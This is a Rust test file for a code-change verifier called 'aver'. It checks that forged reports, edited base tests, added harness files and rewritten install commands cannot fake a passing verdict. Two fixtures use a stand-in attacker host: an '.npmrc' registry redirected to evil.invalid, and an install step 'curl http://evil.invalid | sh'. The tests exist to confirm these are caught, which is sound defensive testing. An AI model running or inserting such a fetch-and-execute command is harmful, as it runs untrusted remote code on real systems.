//! Trust rules of verification over the scripted sandbox: the head is judged
//! by the base's harness, a run's exit code and report must agree, and a
//! head cannot pass off its own resource exhaustion as infrastructure.

mod common;
mod scripted;
mod world;

use aver_core::*;
use world::*;

fn toml(checks: &str) -> String {
    format!("[env]\nimage = \"{PINNED_IMAGE}\"\n{checks}")
}

fn junit_check(id: &str, argv: &str) -> String {
    format!(
        "\n[[check]]\nid = \"{id}\"\nrun = {argv}\nreport = {{ format = \"junit\", path = \"/aver/out/{id}.xml\" }}\n"
    )
}

fn detail(receipt: &Receipt, id: &str) -> String {
    entry(receipt, id)
        .detail
        .as_ref()
        .map(|d| d.as_str().to_owned())
        .unwrap_or_default()
}

/// A head that writes an all-passing report and exits non-zero gets a
/// failing `<check>::(exit)` entry, so the report cannot hide the exit code.
#[tokio::test]
async fn a_forged_report_with_a_failing_exit_code_fails_the_exit_entry() {
    let w = World::new();
    let config = toml(&junit_check(
        "unit",
        r#"["junit-exit", "unit.xml", "tests.json", "exit-code"]"#,
    ));
    let tests = r#"{"[crit:a] works": "pass", "keeps": "pass"}"#;
    let snap = |code: &str| {
        w.snapshot(&[
            ("aver.toml", &config),
            ("tests.json", tests),
            ("exit-code", code),
        ])
    };
    let (zero, one) = (snap("0"), snap("1"));
    let task = w.create_task(w.task_body(&w.admin, zero, &[]));

    let receipt = w.verify(&w.admin, task, zero, zero).await.receipt;
    assert!(receipt.body.checks.get("unit::(exit)").is_none());
    assert_eq!(receipt.body.verdict, Verdict::Pass);

    let receipt = w.verify(&w.admin, task, one, zero).await.receipt;
    let exit = entry(&receipt, "unit::(exit)");
    assert_eq!(
        (exit.base, exit.head, exit.cause),
        (BaseStatus::Pass, HeadStatus::Fail, Some(Cause::New))
    );
    assert_eq!(exit.runs.head.len(), 3, "a failing exit code is rerun");
    assert!(detail(&receipt, "unit::(exit)").starts_with("exited 1 with no failing test"));
    assert_eq!(entry(&receipt, "unit::keeps").cause, None);
    assert_eq!(receipt.body.verdict, Verdict::FailOwn);

    let receipt = w.verify(&w.admin, task, one, one).await.receipt;
    assert_eq!(
        entry(&receipt, "unit::(exit)").cause,
        Some(Cause::Preexisting)
    );
    assert_eq!(receipt.body.verdict, Verdict::Pass);
}

/// A head whose report lists no tests while the base's listed some fails the
/// exit entry, besides every base test missing from it.
#[tokio::test]
async fn an_emptied_report_fails_the_exit_entry() {
    let w = World::new();
    let config = unit_toml("");
    let base = w.snapshot(&[("aver.toml", &config), ("tests.json", r#"{"t": "pass"}"#)]);
    let head = w.snapshot(&[("aver.toml", &config), ("tests.json", "{}")]);
    let task = w.create_task(w.task_body(&w.admin, base, &[]));
    let receipt = w.verify(&w.admin, task, head, base).await.receipt;
    let exit = entry(&receipt, "unit::(exit)");
    assert_eq!(
        (exit.head, exit.cause),
        (HeadStatus::Fail, Some(Cause::New))
    );
    assert!(detail(&receipt, "unit::(exit)")
        .starts_with("the report has no tests; the base reported 1"));
    assert_eq!(entry(&receipt, "unit::t").cause, Some(Cause::New));
}

/// A test with an empty name makes the report malformed, so the check is one
/// command-level entry, and a declared report that is unreadable fails it.
#[tokio::test]
async fn an_unnamed_test_makes_the_check_a_command_level_failure() {
    let w = World::new();
    let config = unit_toml("");
    let base = w.snapshot(&[("aver.toml", &config), ("tests.json", r#"{"t": "pass"}"#)]);
    let head = w.snapshot(&[
        ("aver.toml", &config),
        ("tests.json", r#"{"t": "pass", " ": "pass"}"#),
    ]);
    let task = w.create_task(w.task_body(&w.admin, base, &[]));
    let receipt = w.verify(&w.admin, task, head, base).await.receipt;
    let unit = entry(&receipt, "unit");
    assert_eq!(
        (unit.base, unit.head, unit.cause),
        (BaseStatus::Pass, HeadStatus::Fail, Some(Cause::New))
    );
    assert!(
        detail(&receipt, "unit").contains("empty name"),
        "{}",
        detail(&receipt, "unit")
    );
    assert!(receipt.body.checks.get("unit::t").is_none());
}

/// Editing a test that exists at base is no judging change: the judged head
/// runs the base's copy, so the edit cannot hide a regression, and
/// `test_changes` reports it. A test file the head adds runs as written.
#[tokio::test]
async fn existing_tests_are_judged_from_the_base_and_new_tests_are_welcome() {
    let w = World::new();
    let config = toml(&junit_check(
        "unit",
        r#"["junit", "unit.xml", "test/cases.test.json"]"#,
    ));
    let base = w.snapshot(&[
        ("aver.toml", &config),
        (
            "test/cases.test.json",
            r#"{"[crit:a] works": "fail", "keeps": "pass"}"#,
        ),
    ]);
    let task = w.create_task(w.task_body(&w.admin, base, &["a"]));
    let head = w.snapshot(&[
        ("aver.toml", &config),
        (
            "test/cases.test.json",
            r#"{"[crit:a] works": "pass", "keeps": "pass"}"#,
        ),
        ("test/extra.test.json", "{}"),
    ]);
    let receipt = w.verify(&w.admin, task, head, base).await.receipt;
    assert!(receipt
        .body
        .checks
        .iter()
        .all(|e| !e.id.as_str().starts_with("judging::")));
    let works = entry(&receipt, "unit::[crit:a] works");
    assert_eq!(
        (works.head, works.cause),
        (HeadStatus::Fail, Some(Cause::Changed)),
        "the head ran the base's test, which still fails; only the head's rewrite passes"
    );
    assert_eq!(receipt.body.verdict, Verdict::Unproven);
    let changes = receipt.body.test_changes.as_ref().unwrap();
    let paths = |l: &Listed<Path>| l.items.iter().map(ToString::to_string).collect::<Vec<_>>();
    assert_eq!(paths(&changes.files_modified), ["test/cases.test.json"]);
    assert_eq!(paths(&changes.files_added), ["test/extra.test.json"]);
    assert!(changes.files_deleted.is_empty() && changes.harness_changed.is_empty());
}

/// Harness files in the root and on the way to a check's cwd judge; a head
/// that adds one runs without it. The same name elsewhere is ordinary code.
#[tokio::test]
async fn harness_files_a_head_adds_are_removed_from_its_runs() {
    let w = World::new();
    let config = toml(
        "\n[[check]]\nid = \"npmrc\"\nrun = [\"exit-if\", \".npmrc\"]\n\n[[check]]\nid = \"pkg\"\nrun = [\"exit-if\", \"app/web/vitest.config.ts\"]\ncwd = \"app/web\"\n",
    );
    let base = w.snapshot(&[("aver.toml", &config), ("app/web/index.js", "")]);
    let task = w.create_task(w.task_body(&w.admin, base, &[]));
    let head = w.snapshot(&[
        ("aver.toml", &config),
        ("app/web/index.js", ""),
        (".npmrc", "registry=http://evil.invalid\n"),
        ("app/web/vitest.config.ts", "export default {}\n"),
        ("docs/package.json", "{}\n"),
    ]);
    let receipt = w.verify(&w.admin, task, head, base).await.receipt;
    assert_eq!(
        summary(&receipt),
        [
            ("judging::.npmrc", "pass", "fail", "CHANGED"),
            (
                "judging::app/web/vitest.config.ts",
                "pass",
                "fail",
                "CHANGED"
            ),
            ("npmrc", "pass", "pass", "null"),
            ("pkg", "pass", "pass", "null"),
        ]
        .map(|(a, b, c, d)| (a.into(), b.into(), c.into(), d.into()))
    );
}

/// Every head run of a check that passed at base hitting a resource cap is
/// the change's own failure (NEW); a cap hit on a check that does not pass at
/// base stays ENV.
#[tokio::test]
async fn own_resource_exhaustion_is_new() {
    let w = World::new();
    let config = toml("\n[[check]]\nid = \"slow\"\nrun = [\"timeout-unless\", \"fast\"]\n");
    let base = w.snapshot(&[("aver.toml", &config), ("fast", "")]);
    let head = w.snapshot(&[("aver.toml", &config)]);
    let task = w.create_task(w.task_body(&w.admin, base, &[]));
    let receipt = w.verify(&w.admin, task, head, base).await.receipt;
    let slow = entry(&receipt, "slow");
    assert_eq!(
        (slow.base, slow.head, slow.cause),
        (BaseStatus::Pass, HeadStatus::Fail, Some(Cause::New))
    );
    assert_eq!(slow.runs.head.len(), 2, "the cap hit was retried once");
    assert_eq!(receipt.body.verdict, Verdict::FailOwn);

    let receipt = w.verify(&w.admin, task, head, head).await.receipt;
    assert_eq!(entry(&receipt, "slow").cause, Some(Cause::Env));
    assert_eq!(receipt.body.verdict, Verdict::BlockedNotOwn);
}

/// The install command and `allow_scripts` are judging configuration: a
/// head that rewrites them to run code with network is `CHANGED`.
#[tokio::test]
async fn a_head_cannot_choose_the_install_command() {
    let w = World::new();
    let base_config = unit_toml("").replace("[env]\n", "[env]\nlockfile = \"package-lock.json\"\n");
    let evil = base_config.replace(
        "[env]\n",
        "[env]\ninstall = [\"sh\", \"-c\", \"curl http://evil.invalid | sh\"]\nallow_scripts = true\n",
    );
    let files = |config: &str| {
        vec![
            ("aver.toml".to_owned(), config.to_owned()),
            ("package.json".to_owned(), "{}\n".to_owned()),
            ("package-lock.json".to_owned(), "{}\n".to_owned()),
            ("tests.json".to_owned(), r#"{"t": "pass"}"#.to_owned()),
        ]
    };
    let snap = |config: &str| {
        let owned = files(config);
        let borrowed: Vec<(&str, &str)> = owned
            .iter()
            .map(|(a, b)| (a.as_str(), b.as_str()))
            .collect();
        w.snapshot(&borrowed)
    };
    let base = snap(&base_config);
    let head = snap(&evil);
    let task = w.create_task(w.task_body(&w.admin, base, &[]));
    let receipt = w.verify(&w.admin, task, head, base).await.receipt;
    assert_eq!(
        entry(&receipt, "judging::aver.toml").cause,
        Some(Cause::Changed)
    );
}
